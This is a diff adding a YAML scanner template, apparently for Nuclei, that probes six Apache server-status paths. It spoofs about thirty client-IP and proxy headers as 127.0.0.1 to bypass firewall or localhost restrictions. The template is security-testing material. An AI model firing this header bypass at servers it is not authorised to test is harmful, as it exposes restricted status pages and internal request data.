@@ -1,0 +1,62 @@
+id: apacheserverstatus-bypass
+
+info:
+  name: apacheserverstatus-bypass
+  author: osamahamad
+  severity: high
+  description: Detects server status page with using waf headers bypass
+  tags: activescan
+
+requests:
+  - method: GET
+
+    headers:
+
+      X-Forwarded-Host: 127.0.0.1
+      X-Forwarded-Port: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      Client-IP: 127.0.0.1
+      Proxy-Host: 127.0.0.1
+      X-Forwarded: 127.0.0.1
+      X-Forwarded-By: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Forwarded-For-Original: 127.0.0.1
+      X-Forwarded-Host: 127.0.0.1
+      X-Forwarded-Server: 127.0.0.1
+      X-Forwarder-For: 127.0.0.1
+      X-Forward-For: 127.0.0.1
+      Real-Ip: 127.0.0.1
+      X-Host: 127.0.0.1
+      X-Http-Destinationurl: 127.0.0.1
+      X-Http-Host-Override: 127.0.0.1
+      X-Original-Remote-Addr: 127.0.0.1
+      X-Original-Url: 127.0.0.1
+      X-Proxy-Url: 127.0.0.1
+      X-Rewrite-Url: 127.0.0.1
+      X-Real-Ip: 127.0.0.1
+      X-Remote-Addr: 127.0.0.1
+      X-Custom-IP-Authorization: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Original-Url: 127.0.0.1
+      X-Forwarded-Server: 127.0.0.1
+      X-Host: 127.0.0.1
+      X-Forwarded-Host: 127.0.0.1
+      X-Rewrite-Url: 127.0.0.1
+      
+
+    path:
+      - "{{BaseURL}}/server-status"
+      - "{{BaseURL}}/apache-status"
+      - "{{BaseURL}}/apache/server-status"
+      - "{{BaseURL}}/server/server-status"
+      - "{{BaseURL}}/api/server-status"
+      - "{{BaseURL}}/api/v1/server-status"
+
+    matchers:
+      - type: word
+        words:
+          - Apache Server Status
+          - Server Version
+        condition: and
